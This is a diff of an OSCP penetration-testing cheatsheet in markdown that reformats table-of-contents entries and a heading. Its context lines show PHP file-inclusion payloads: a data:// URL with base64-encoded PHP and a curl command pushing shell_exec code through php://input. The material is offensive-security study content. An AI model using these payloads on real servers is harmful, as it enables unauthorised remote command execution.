@@ -56,7 +56,7 @@ description: "OSCP personal cheatsheet"
       - [Wrapper expect://](#wrapper-expect)
       - [Wrapper data://](#wrapper-data)
       - [Wrapper input://](#wrapper-input)
-  * [Useful LFI list](#useful-lfi-list)
+    + [Useful LFI list](#useful-lfi-list)
     + [Tools](#tools)
   * [Command injection](#command-injection)
   * [Deserialization](#deserialization)
@@ -65,7 +65,7 @@ description: "OSCP personal cheatsheet"
   * [XSS](#xss)
   * [Other web vulnerabilities](#other-web-vulnerabilities)
   * [Upload a file with PUT](#upload-a-file-with-put)
-  
+
 - [KERBEROS - 88](#kerberos---88)
 
 - [POP3 - 110](#pop3---110)
@@ -632,7 +632,7 @@ http://example.com/index.php?page=data://text/plain;base64,PD9waHAgcGFzc3RocnUoJ
 curl -k -v "http://example.com/index.php?page=php://input" --data "<?php echo shell_exec('id'); ?>"
 ```
 
-### Useful LFI list
+#### Useful LFI list
 
 ```
 # Linux
